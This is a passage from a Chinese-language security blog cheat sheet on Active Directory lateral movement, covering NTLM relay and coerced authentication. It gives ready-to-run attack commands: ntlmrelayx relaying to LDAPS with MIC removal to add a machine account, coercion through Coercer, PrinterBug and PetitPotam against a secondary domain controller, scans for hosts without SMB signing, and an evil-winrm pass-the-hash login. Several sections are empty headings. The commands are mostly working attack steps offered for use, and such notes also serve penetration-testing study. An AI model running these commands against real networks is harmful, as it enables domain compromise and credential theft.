<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 开启监听器 ntlmrelay.<span class="keyword">py</span>,添加消除 mic 验证参数 --<span class="built_in">remove</span>-mic</span><br><span class="line"><span class="keyword">python3</span> ntlmrelayx.<span class="keyword">py</span> -t ldap<span class="variable">s:</span>//dc01.domain.<span class="keyword">com</span> --<span class="built_in">add</span>-computer JustTest$ --<span class="built_in">remove</span>-mic</span><br><span class="line"></span><br><span class="line"># 执行强制认证</span><br><span class="line"><span class="keyword">python3</span> Coercer.<span class="keyword">py</span> -<span class="keyword">u</span> spiderman -<span class="keyword">p</span> <span class="number">123</span>.<span class="keyword">com</span> -d <span class="symbol">&lt;DomainName&gt;</span> -<span class="keyword">l</span> &lt;攻击IP&gt; -t &lt;辅控IP&gt; --analyze</span><br></pre></td></tr></table></figure>



<blockquote>
<p>PrinterBug</p>
<p>强制任何运行了Spooler服务的计算机通过<code>Kerberos</code>或<code>NTLM</code>进行强制身份验证</p>
<ul>
<li>打印服务开启 - spoolsv.exe</li>
</ul>
</blockquote>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 开启监听器 ntlmrelay.<span class="keyword">py</span>,添加消除 mic 验证参数 --<span class="built_in">remove</span>-mic</span><br><span class="line"><span class="keyword">python3</span> ntlmrelayx.<span class="keyword">py</span> -t ldap<span class="variable">s:</span>//dc01.domain.<span class="keyword">com</span> --<span class="built_in">add</span>-computer JustTest$ --<span class="built_in">remove</span>-mic</span><br><span class="line"></span><br><span class="line"># 使用 printerbug.<span class="keyword">py</span> 触发辅域控进行强制验证</span><br><span class="line"># 攻击辅域控是因为域控发起的验证不能中继回自身</span><br><span class="line"><span class="keyword">python3</span> printerbug.<span class="keyword">py</span> hack.lab/spiderman:<span class="number">123</span>.com@&lt;辅控IP&gt; &lt;攻击IP&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/topotam/PetitPotam">PetitPotam</a></p>
<p>劫持目标函数中的FileName参数触发强制认证</p>
<ul>
<li>目标支持 MS-EFSR 协议</li>
<li>拥有一个域用户凭据信息</li>
</ul>
</blockquote>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 开启监听器 ntlmrelay.<span class="keyword">py</span>,添加消除 mic 验证参数 --<span class="built_in">remove</span>-mic</span><br><span class="line"><span class="keyword">python3</span> ntlmrelayx.<span class="keyword">py</span> -t ldap<span class="variable">s:</span>//dc01.domain.<span class="keyword">com</span> --<span class="built_in">add</span>-computer JustTest$ --<span class="built_in">remove</span>-mic</span><br><span class="line"></span><br><span class="line"># 使用 PeitiPotam 利用工具进行强制触发认证，也是以辅域控为目标</span><br><span class="line"><span class="keyword">python3</span> PetitPotam.<span class="keyword">py</span> -d domain.<span class="keyword">com</span> -<span class="keyword">u</span> spiderman -<span class="keyword">p</span> <span class="number">123</span>.<span class="keyword">com</span> &lt;攻击IP&gt; &lt;辅控IP&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="(https://github.com/Wh04m1001/DFSCoerce)">DFSCoerce</a></p>
<p>使用 MS-EFSRPC 协议中的RPC接口来触发强制认证</p>
<ul>
<li>域内启用 MS-DFSNM 协议</li>
<li>拥有一个域用户凭据信息</li>
<li>只对域控有效</li>
</ul>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/ShutdownRepo/ShadowCoerce">ShadowCoerce</a></p>
<p>通过使用一种依赖于远程UNC路径的特定方法来实现强制验证 —— IsPathSupported() 和 IsPathShadowCopied()</p>
<ul>
<li>目标服务器安装了文件服务器VSS代理服务</li>
<li>开启MS-FSRVP协议</li>
<li>拥有一个域用户凭据信息</li>
</ul>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/privexchange/">PrivExchange</a></p>
<p>利用该API迫使Exchange服务器对指定目标进行强制认证</p>
<ul>
<li>目标为Exchange，且未打补丁</li>
<li>拥有一个带有邮箱的域用户凭据信息</li>
</ul>
</blockquote>
<h6 id="SMB中继"><a href="#SMB中继" class="headerlink" title="SMB中继"></a>SMB中继</h6><blockquote>
<p>客户端在连接服务端时默认先使用本机的用户名和密码Hash尝试登录，所以可以模拟SMB服务器从而截获其它PC的Net-NTLM Hash，而作为中继的机器必须要有域管理员权限或本地管理员权限，且被中继的机器要关闭SMB签名认证，否则无法去做中继。</p>
<ul>
<li>SMB签名需要关闭(默认情况下除域控外都没开启签名。SMB3以下都是默认关闭的)</li>
</ul>
</blockquote>
<blockquote>
<p>检查签名</p>
<p>第一步就应该检查签名开启状况</p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec?tab=readme-ov-file">CrackMapExec</a></p>
<p>非常强大的内网工具，kali自带</p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接扫网段</span></span><br><span class="line">crackmapexec<span class="built_in"> smb </span>&lt;IPv4 CIDR&gt; --gen-relay-list relayTargets.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫指定主机，多个主机可以用空格隔开</span></span><br><span class="line">crackmapexec<span class="built_in"> smb </span>&lt;IP&gt; --gen-relay-list relayTargets.txt</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder/blob/master/tools/RunFinger.py">RunFinger</a></p>
</blockquote>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python <span class="module-access"><span class="module"><span class="identifier">RunFinger</span>.</span></span>py -i &lt;IPv4 CIDR&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Nmap</p>
<p>nmap 的 nes 脚本 <a target="_blank" rel="noopener" href="https://nmap.org/nsedoc/scripts/smb-security-mode.html">smb-security-mode.nse</a></p>
</blockquote>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 扫描网段</span><br><span class="line"><span class="keyword">nmap</span> --script=smb-security-<span class="keyword">mode</span>.nse -<span class="keyword">p</span> <span class="number">445</span> -n -Pn --<span class="keyword">open</span> <span class="number">192.168</span>.<span class="number">111.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line"># 扫描指定范围</span><br><span class="line"><span class="keyword">nmap</span> --script=smb-security-<span class="keyword">mode</span>.nse -<span class="keyword">p</span> <span class="number">445</span> -n -Pn --<span class="keyword">open</span> <span class="symbol">&lt;IP&gt;</span>-<span class="symbol">&lt;IP&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SMB <span class="keyword">To</span> SMB</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP <span class="keyword">To</span> LDAP</span><br></pre></td></tr></table></figure>

<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP <span class="keyword">To</span> HTTP</span><br></pre></td></tr></table></figure>







<h2 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -u <span class="tag">&lt;<span class="name">username</span>&gt;</span> -H <span class="tag">&lt;<span class="name">NT</span> <span class="attr">hash</span>&gt;</span> -i <span class="tag">&lt;<span class="name">IP</span>&gt;</span></span><br></pre></td></tr></table></figure>






<h3 id="服务-1"><a href="#服务-1" class="headerlink" title="服务"></a>服务</h3><h3 id="密码碰撞"><a href="#密码碰撞" class="headerlink" title="密码碰撞"></a>密码碰撞</h3><h3 id="密码喷射-1"><a href="#密码喷射-1" class="headerlink" title="密码喷射"></a>密码喷射</h3><h3 id="内网权限维持"><a href="#内网权限维持" class="headerlink" title="内网权限维持"></a>内网权限维持</h3><h3 id="邮服后渗透"><a href="#邮服后渗透" class="headerlink" title="邮服后渗透"></a>邮服后渗透</h3><h2 id="Windows-Server-2012r2-开启vmwaretools灰色"><a href="#Windows-Server-2012r2-开启vmwaretools灰色" class="headerlink" title="Windows Server 2012r2 开启vmwaretools灰色"></a>Windows Server 2012r2 开启vmwaretools灰色</h2><blockquote>
<p>1、KB2919442</p>
<p>2、KB2919355</p>
<p>再安装vmwaretools</p>
</blockquote>

	  <div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>

	</div>

	
	<span id="/post/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/" class="leancloud-visitors view" data-flag-title="内网横向">
		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
	</span>
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/post/ExchangeAttack/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/post/SQLI_Bypass/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>

    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-01-02 
	</div>
	

	<!-- categories -->
    

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-article-text">信息收集</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8D%95%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-article-text">单机信息收集</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%98%B2%E6%8A%A4%E8%AE%BE%E5%A4%87%E6%94%B6%E9%9B%86"><span class="toc-article-text">防护设备收集</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%BF%9B%E7%A8%8B%E3%80%81%E6%9C%8D%E5%8A%A1%E3%80%81%E5%BA%94%E7%94%A8%E3%80%81%E9%98%B2%E6%8A%A4%E3%80%81%E8%AE%A1%E5%88%92"><span class="toc-article-text">进程、服务、应用、防护、计划</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9C%8D%E5%8A%A1"><span class="toc-article-text">服务</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AE%89%E8%A3%85%E5%BA%94%E7%94%A8"><span class="toc-article-text">安装应用</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#RDP%E7%AB%AF%E5%8F%A3"><span class="toc-article-text">RDP端口</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-article-text">计划任务</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%BD%91%E6%AE%B5%E8%8E%B7%E5%8F%96"><span class="toc-article-text">网段获取</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96"><span class="toc-article-text">凭证获取</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6"><span class="toc-article-text">数据库文件</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="toc-article-text">敏感文件</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-article-text">浏览器</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4"><span class="toc-article-text">历史命令</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%85%B1%E4%BA%AB"><span class="toc-article-text">共享</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%9B%9E%E6%94%B6%E7%AB%99"><span class="toc-article-text">回收站</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Wi-Fi"><span class="toc-article-text">Wi-Fi</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%82%AE%E7%AE%B1%E6%94%B6%E9%9B%86"><span class="toc-article-text">邮箱收集</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%87%AD%E8%AF%81%E7%AE%A1%E7%90%86%E5%99%A8"><span class="toc-article-text">凭证管理器</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#PPTP-VPN"><span class="toc-article-text">PPTP VPN</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95"><span class="toc-article-text">键盘记录</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81"><span class="toc-article-text">软件密码</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99%E4%BF%A1%E6%81%AF"><span class="toc-article-text">防火墙信息</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E6%94%B6%E9%9B%86"><span class="toc-article-text">自动化收集</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#AD%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-article-text">AD域信息收集</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9F%A5%E6%89%BE%E5%9F%9F%E6%8E%A7"><span class="toc-article-text">查找域控</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AE%9A%E4%BD%8D%E5%9F%9F%E6%8E%A7"><span class="toc-article-text">定位域控</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1"><span class="toc-article-text">定位域管</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#AD%E6%95%B0%E6%8D%AE%E5%BA%93%E8%8E%B7%E5%8F%96%E5%93%88%E5%B8%8C"><span class="toc-article-text">AD数据库获取哈希</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-article-text">用户信息</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%94%A8%E6%88%B7%E6%8F%8F%E8%BF%B0%E4%BF%A1%E6%81%AF"><span class="toc-article-text">用户描述信息</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%94%A8%E6%88%B7%E9%A2%84%E8%AE%A4%E8%AF%81"><span class="toc-article-text">用户预认证</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#SPN"><span class="toc-article-text">SPN</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%BB%84%E4%BF%A1%E6%81%AF"><span class="toc-article-text">组信息</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%BB%84%E7%BB%87%E5%8D%95%E5%85%83"><span class="toc-article-text">组织单元</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Kerberos%E5%A7%94%E6%B4%BE"><span class="toc-article-text">Kerberos委派</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-article-text">非约束委派</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-article-text">约束委派</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-article-text">资源约束委派</span></a></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-article-text">内网横向移动</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="toc-article-text">文件传输</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB"><span class="toc-article-text">网络共享</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Windows%E8%87%AA%E5%B8%A6%E4%B8%8B%E8%BD%BD%E5%B7%A5%E5%85%B7"><span class="toc-article-text">Windows自带下载工具</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#at-amp-schtasks-amp-sc%E6%A8%AA%E5%90%91"><span class="toc-article-text">at&amp; schtasks &amp; sc横向</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#SMB%E5%8D%8F%E8%AE%AE"><span class="toc-article-text">SMB协议</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#psexec"><span class="toc-article-text">psexec</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#smbexec"><span class="toc-article-text">smbexec</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#smbclient"><span class="toc-article-text">smbclient</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CrackMapExec"><span class="toc-article-text">CrackMapExec</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#mimikatz"><span class="toc-article-text">mimikatz</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#WMI"><span class="toc-article-text">WMI</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#wmic"><span class="toc-article-text">wmic</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#wmiexec"><span class="toc-article-text">wmiexec</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#sharpwmi"><span class="toc-article-text">sharpwmi</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Sharp-WMIEvent"><span class="toc-article-text">Sharp-WMIEvent</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#wmihacker"><span class="toc-article-text">wmihacker</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Wmiexec-Pro"><span class="toc-article-text">Wmiexec-Pro</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Powershell-Invoke-TheHash"><span class="toc-article-text">Powershell:Invoke-TheHash</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#mimikatz-1"><span class="toc-article-text">mimikatz</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#DCOM%E5%88%A9%E7%94%A8"><span class="toc-article-text">DCOM利用</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%88%A9%E7%94%A8"><span class="toc-article-text">远程桌面利用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#RDP-%E5%8A%AB%E6%8C%81"><span class="toc-article-text">RDP 劫持</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#sharpRDP"><span class="toc-article-text">sharpRDP</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link"><span class="toc-article-text"></span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Kerberos%E5%88%A9%E7%94%A8"><span class="toc-article-text">Kerberos利用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE"><span class="toc-article-text">用户名枚举</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84"><span class="toc-article-text">密码喷射</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Hash-%E7%88%86%E7%A0%B4"><span class="toc-article-text">Hash 爆破</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#WinRM%E5%88%A9%E7%94%A8"><span class="toc-article-text">WinRM利用</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PTH-amp-PTK-amp-PTT"><span class="toc-article-text">PTH&amp;PTK&amp;PTT</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92-PTH"><span class="toc-article-text">哈希传递(PTH)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-article-text">常见利用方式</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%A7%98%E9%92%A5%E4%BC%A0%E9%80%92-PTK"><span class="toc-article-text">秘钥传递(PTK)</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92-PTT"><span class="toc-article-text">票据传递(PTT)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-Golden-ticket"><span class="toc-article-text">黄金票据(Golden ticket)</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-Silver-ticket"><span class="toc-article-text">白银票据(Silver ticket)</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-article-text">黄金票据和白银票据的区别</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#ms14-068"><span class="toc-article-text">ms14-068</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#CVE-2021-42278"><span class="toc-article-text">CVE-2021-42278</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#CVE-2021-42287"><span class="toc-article-text">CVE-2021-42287</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#CVE-2021-42288"><span class="toc-article-text">CVE-2021-42288</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Kerberos%E5%A7%94%E6%B4%BE-1"><span class="toc-article-text">Kerberos委派</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#NTML"><span class="toc-article-text">NTML</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#NTML-1"><span class="toc-article-text">NTML</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#NTLM-Replay-NTML%E4%B8%AD%E7%BB%A7"><span class="toc-article-text">NTLM Replay(NTML中继)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%8D%95%E8%8E%B7-NTLM-%E5%93%88%E5%B8%8C"><span class="toc-article-text">捕获 NTLM 哈希</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E5%8D%8F%E8%AE%AE%E6%AC%BA%E9%AA%97"><span class="toc-article-text">协议欺骗</span></a></li><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E5%BC%BA%E5%88%B6%E8%AE%A4%E8%AF%81"><span class="toc-article-text">强制认证</span></a></li><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#SMB%E4%B8%AD%E7%BB%A7"><span class="toc-article-text">SMB中继</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#WinRM"><span class="toc-article-text">WinRM</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9C%8D%E5%8A%A1-1"><span class="toc-article-text">服务</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AF%86%E7%A0%81%E7%A2%B0%E6%92%9E"><span class="toc-article-text">密码碰撞</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84-1"><span class="toc-article-text">密码喷射</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-article-text">内网权限维持</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%82%AE%E6%9C%8D%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-article-text">邮服后渗透</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Windows-Server-2012r2-%E5%BC%80%E5%90%AFvmwaretools%E7%81%B0%E8%89%B2"><span class="toc-article-text">Windows Server 2012r2 开启vmwaretools灰色</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2024 hitman's Blog
  
      . wubba <a href="http://hexo.io/" target="_blank">lubba</a> dub <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank"> dub.</a>  
</p>

 </footer>
</div> <!-- container-narrow -->
  



  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
